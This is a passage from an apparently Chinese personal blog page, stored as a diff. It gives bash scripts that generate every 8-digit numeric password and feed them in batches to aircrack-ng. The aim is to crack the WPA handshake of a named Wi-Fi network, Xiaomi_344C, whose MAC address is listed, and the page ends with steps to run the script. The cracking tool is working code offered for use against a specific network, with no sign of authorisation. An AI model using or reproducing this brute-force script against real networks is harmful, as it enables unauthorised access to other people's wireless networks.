+    <span class="pl-c"><span class="pl-c">#</span> 生成密码</span>
+    seq <span class="pl-smi">$start_num</span> <span class="pl-smi">$end_num</span> <span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$filename</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 检查生成结果</span>
+    actual_count=<span class="pl-s"><span class="pl-pds">$(</span>wc -l <span class="pl-k">&lt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$filename</span><span class="pl-pds">"</span></span><span class="pl-pds">)</span></span>
+    file_size=<span class="pl-s"><span class="pl-pds">$(</span>wc -c <span class="pl-k">&lt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$filename</span><span class="pl-pds">"</span></span><span class="pl-pds">)</span></span>
+    
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>✅ 密码生成完成!<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>📁 文件: <span class="pl-smi">$filename</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>📊 实际生成: <span class="pl-smi">$actual_count</span> 个密码<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>💾 文件大小: <span class="pl-smi">$file_size</span> 字节<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>前10个密码预览:<span class="pl-pds">"</span></span>
+    head -10 <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$filename</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-k">if</span> [ <span class="pl-smi">$actual_count</span> <span class="pl-k">-gt</span> 10 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>...<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>后10个密码预览:<span class="pl-pds">"</span></span>
+        tail -10 <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$filename</span><span class="pl-pds">"</span></span>
+    <span class="pl-k">fi</span>
+}
+
+<span class="pl-c"><span class="pl-c">#</span> 运行主函数</span>
+main <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$@</span><span class="pl-pds">"</span></span> </pre></div>
+<h1>自动跑任务脚本</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 8位纯数字密码完整破解脚本</span>
+<span class="pl-c"><span class="pl-c">#</span> 范围：10000000-99999999 (9000万个密码)</span>
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>=== 8位纯数字密码完整破解脚本 ===<span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>开始时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 创建报告文件</span>
+report_file=<span class="pl-s"><span class="pl-pds">"</span>crack_report_<span class="pl-s"><span class="pl-pds">$(</span>date +%Y%m%d_%H%M%S<span class="pl-pds">)</span></span>.txt<span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>8位纯数字密码破解报告<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>开始时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>目标网络: Xiaomi_344C (44:F7:70:28:D1:32)<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>========================================<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 定义范围参数</span>
+start_range=10000000
+end_range=99999999
+batch_size=1000000  <span class="pl-c"><span class="pl-c">#</span> 每批100万个密码</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 计算总批次数</span>
+total_batches=<span class="pl-s"><span class="pl-pds">$((</span>(end_range <span class="pl-k">-</span> start_range <span class="pl-k">+</span> <span class="pl-c1">1</span>) <span class="pl-k">/</span> batch_size<span class="pl-pds">))</span></span>
+current_batch=1
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>总范围: <span class="pl-smi">$start_range</span> 到 <span class="pl-smi">$end_range</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>每批大小: <span class="pl-smi">$batch_size</span> 个密码<span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>总批次数: <span class="pl-smi">$total_batches</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 主循环</span>
+<span class="pl-k">for</span> <span class="pl-s"><span class="pl-pds">((</span>batch_start<span class="pl-k">=</span>start_range; batch_start<span class="pl-k">&lt;=</span>end_range; batch_start<span class="pl-k">+=</span>batch_size<span class="pl-pds">))</span></span><span class="pl-k">;</span> <span class="pl-k">do</span>
+    batch_end=<span class="pl-s"><span class="pl-pds">$((</span>batch_start <span class="pl-k">+</span> batch_size <span class="pl-k">-</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 确保不超过最大范围</span>
+    <span class="pl-k">if</span> [ <span class="pl-smi">$batch_end</span> <span class="pl-k">-gt</span> <span class="pl-smi">$end_range</span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        batch_end=<span class="pl-smi">$end_range</span>
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>========================================<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>批次 <span class="pl-smi">$current_batch</span>/<span class="pl-smi">$total_batches</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>范围: <span class="pl-smi">$batch_start</span> 到 <span class="pl-smi">$batch_end</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>开始时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 生成密码文件</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>正在生成密码文件...<span class="pl-pds">"</span></span>
+    ./generate_password.sh -s <span class="pl-smi">$batch_start</span> -e <span class="pl-smi">$batch_end</span> -o <span class="pl-s"><span class="pl-pds">"</span>batch_<span class="pl-smi">${current_batch}</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-k">if</span> [ <span class="pl-smi">$?</span> <span class="pl-k">-ne</span> 0 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>❌ 密码生成失败，跳过此批次<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>批次 <span class="pl-smi">$current_batch</span>: <span class="pl-smi">$batch_start</span>-<span class="pl-smi">$batch_end</span> - 生成失败<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        current_batch=<span class="pl-s"><span class="pl-pds">$((</span>current_batch <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span>
+        <span class="pl-k">continue</span>
+    <span class="pl-k">fi</span>
+    
+    password_file=<span class="pl-s"><span class="pl-pds">"</span>batch_<span class="pl-smi">${current_batch}</span>_<span class="pl-smi">${batch_start}</span>_to_<span class="pl-smi">${batch_end}</span>.txt<span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 检查文件是否存在</span>
+    <span class="pl-k">if</span> [ <span class="pl-k">!</span> <span class="pl-k">-f</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>❌ 密码文件不存在: <span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>批次 <span class="pl-smi">$current_batch</span>: <span class="pl-smi">$batch_start</span>-<span class="pl-smi">$batch_end</span> - 文件不存在<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        current_batch=<span class="pl-s"><span class="pl-pds">$((</span>current_batch <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span>
+        <span class="pl-k">continue</span>
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 开始破解</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>开始破解...<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>使用字典: <span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 运行aircrack-ng并捕获输出</span>
+    crack_output=<span class="pl-s"><span class="pl-pds">$(</span>aircrack-ng -w <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span> ./handshake-01.cap -b 44:F7:70:28:D1:32 <span class="pl-k">2&gt;&amp;1</span><span class="pl-pds">)</span></span>
+    crack_result=<span class="pl-smi">$?</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 检查是否找到密码</span>
+    <span class="pl-k">if</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$crack_output</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> grep -q <span class="pl-s"><span class="pl-pds">"</span>KEY FOUND<span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">then</span>
+        password=<span class="pl-s"><span class="pl-pds">$(</span>echo <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$crack_output</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>KEY FOUND<span class="pl-pds">"</span></span> <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print $4}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>🎉 密码找到了!<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>密码: <span class="pl-smi">$password</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>范围: <span class="pl-smi">$batch_start</span> 到 <span class="pl-smi">$batch_end</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+        
+        <span class="pl-c"><span class="pl-c">#</span> 记录到报告</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>✅ 成功找到密码!<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>密码: <span class="pl-smi">$password</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>范围: <span class="pl-smi">$batch_start</span> 到 <span class="pl-smi">$batch_end</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>批次: <span class="pl-smi">$current_batch</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>结束时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+        
+        <span class="pl-c"><span class="pl-c">#</span> 删除密码文件</span>
+        rm -f <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>已删除密码文件: <span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span>
+        
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>破解完成！密码已找到。<span class="pl-pds">"</span></span>
+        <span class="pl-c1">break</span>
+    <span class="pl-k">else</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>❌ 在此范围内未找到密码<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>范围: <span class="pl-smi">$batch_start</span> 到 <span class="pl-smi">$batch_end</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+        
+        <span class="pl-c"><span class="pl-c">#</span> 记录到报告</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>❌ 批次 <span class="pl-smi">$current_batch</span>: <span class="pl-smi">$batch_start</span>-<span class="pl-smi">$batch_end</span> - 未找到密码<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-k">fi</span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 删除密码文件以节省空间</span>
+    rm -f <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>已删除密码文件: <span class="pl-smi">$password_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 显示进度</span>
+    progress=<span class="pl-s"><span class="pl-pds">$((</span>current_batch <span class="pl-k">*</span> <span class="pl-c1">100</span> <span class="pl-k">/</span> total_batches<span class="pl-pds">))</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>进度: <span class="pl-smi">$progress</span>% (<span class="pl-smi">$current_batch</span>/<span class="pl-smi">$total_batches</span>)<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>已测试范围: <span class="pl-smi">$start_range</span> 到 <span class="pl-smi">$batch_end</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    
+    current_batch=<span class="pl-s"><span class="pl-pds">$((</span>current_batch <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 每10批次显示一次详细进度</span>
+    <span class="pl-k">if</span> [ <span class="pl-s"><span class="pl-pds">$((</span>current_batch <span class="pl-k">%</span> <span class="pl-c1">10</span><span class="pl-pds">))</span></span> <span class="pl-k">-eq</span> 0 ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>=== 详细进度报告 ===<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>当前时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>已完成批次: <span class="pl-s"><span class="pl-pds">$((</span>current_batch <span class="pl-k">-</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>剩余批次: <span class="pl-s"><span class="pl-pds">$((</span>total_batches <span class="pl-k">-</span> current_batch <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>预计剩余时间: 约 <span class="pl-s"><span class="pl-pds">$((</span> (total_batches <span class="pl-k">-</span> current_batch <span class="pl-k">+</span> <span class="pl-c1">1</span>) <span class="pl-k">*</span> <span class="pl-c1">5</span> <span class="pl-pds">))</span></span> 分钟<span class="pl-pds">"</span></span>
+        <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    <span class="pl-k">fi</span>
+<span class="pl-k">done</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 完成后的总结</span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>========================================<span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>破解任务完成<span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>结束时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 检查是否找到密码</span>
+<span class="pl-k">if</span> grep -q <span class="pl-s"><span class="pl-pds">"</span>✅ 成功找到密码!<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>🎉 破解成功！密码已找到。<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>查看详细报告: <span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+<span class="pl-k">else</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>❌ 所有8位纯数字密码都已测试完毕，未找到正确密码。<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>测试范围: <span class="pl-smi">$start_range</span> 到 <span class="pl-smi">$end_range</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>总密码数: <span class="pl-s"><span class="pl-pds">$((</span>end_range <span class="pl-k">-</span> start_range <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>建议:<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>1. 检查握手包是否有效<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>2. 尝试其他密码类型（字母+数字）<span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>3. 检查目标网络是否使用了非8位数字密码<span class="pl-pds">"</span></span>
+    
+    <span class="pl-c"><span class="pl-c">#</span> 记录最终结果到报告</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>========================================<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>最终结果: 未找到密码<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>测试范围: <span class="pl-smi">$start_range</span> 到 <span class="pl-smi">$end_range</span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>总密码数: <span class="pl-s"><span class="pl-pds">$((</span>end_range <span class="pl-k">-</span> start_range <span class="pl-k">+</span> <span class="pl-c1">1</span><span class="pl-pds">))</span></span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>结束时间: <span class="pl-s"><span class="pl-pds">$(</span>date<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span>
+<span class="pl-k">fi</span>
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>详细报告已保存到: <span class="pl-smi">$report_file</span><span class="pl-pds">"</span></span></pre></div>
+<ul>
+<li>运行完整破解脚本<br>
+./test.sh</li>
+<li>查看实时进度</li>
+<li>tail -f crack_report_*.txt</li>
+</ul></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://tangrenbin.github.io">唐任斌的博客</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("07/11/2024"!=""){
+    var startSite=new Date("07/11/2024");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 